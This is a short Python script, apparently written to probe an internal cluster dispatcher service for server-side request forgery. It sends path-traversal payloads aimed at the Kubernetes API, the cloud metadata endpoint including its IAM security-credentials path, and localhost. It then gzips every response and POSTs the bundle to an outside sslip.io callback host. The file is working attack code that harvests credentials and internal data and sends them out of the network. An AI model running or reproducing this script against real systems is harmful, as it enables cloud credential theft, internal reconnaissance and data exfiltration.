#!/usr/bin/env python3
import gzip, hashlib, json, os, time, urllib.request, urllib.error
BASE=os.environ.get('BUILDMODE_DISPATCHER_URL','http://lrs-pygencc-dispatcher-canv2.canv2-sl-app-launcher.svc.cluster.local')
USER='snapgpt-kube-probe-20261106@armorerlabs.com'
SINK='https://54.209.51.244.sslip.io/callback/snapgpt-ssrfprobe2-20261106T0401Z'
CASES=[
 ('sink6','https://54.209.51.244.sslip.io/callback/snapgpt-kube-traversal6','../../../../../../version'),
 ('kube_version','https://kubernetes.default.svc','../../../../../../version'),
 ('kube_healthz','https://kubernetes.default.svc','../../../../../../healthz'),
 ('kube_api','https://kubernetes.default.svc','../../../../../../api'),
 ('kube_namespaces','https://kubernetes.default.svc','../../../../../../api/v1/namespaces'),
 ('kube_openapi','https://kubernetes.default.svc','../../../../../../openapi/v2'),
 ('imds_root','http://169.254.169.254','../../../../../../latest/meta-data/'),
 ('imds_roles','http://169.254.169.254','../../../../../../latest/meta-data/iam/security-credentials/'),
 ('local_health','http://127.0.0.1:8080','../../../../../../health'),
 ('local_metrics','http://127.0.0.1:8080','../../../../../../metrics'),
]
OUT={'utc':time.strftime('%Y-%m-%dT%H:%M:%SZ',time.gmtime()),'base':BASE,'cases':[]}
for name,host,path in CASES:
 body=json.dumps({'user_id':USER,'host_url':host,'project_path':path,'force':True},separators=(',',':')).encode()
 req=urllib.request.Request(BASE+'/session/init',data=body,method='POST',headers={'Content-Type':'application/json','X-SL-Token':'x'})
 t=time.monotonic(); rec={'name':name,'host_url':host,'project_path':path}
 try:
  with urllib.request.urlopen(req,timeout=20) as r:
   rec.update(status=r.status,body=r.read(30000).decode('utf-8','replace'),headers=dict(r.headers))
 except urllib.error.HTTPError as e:
  rec.update(status=e.code,body=e.read(30000).decode('utf-8','replace'),headers=dict(e.headers))
 except Exception as e:
  rec.update(error=repr(e))
 rec['elapsed']=round(time.monotonic()-t,3)
 OUT['cases'].append(rec)
raw=json.dumps(OUT,sort_keys=True,separators=(',',':')).encode(); gz=gzip.compress(raw,9)
try:
 req=urllib.request.Request(SINK,data=gz,method='POST',headers={'Content-Type':'application/gzip','X-Probe':'ssrfprobe2'})
 with urllib.request.urlopen(req,timeout=30) as r:
  OUT['sink']={'status':r.status,'body':r.read(1000).decode('utf-8','replace')}
except Exception as e:
 OUT['sink']={'error':repr(e)}
print(json.dumps({'sink':OUT.get('sink'),'raw_bytes':len(raw),'gzip_bytes':len(gz),'sha256':hashlib.sha256(raw).hexdigest(),'cases':len(OUT['cases'])},sort_keys=True))
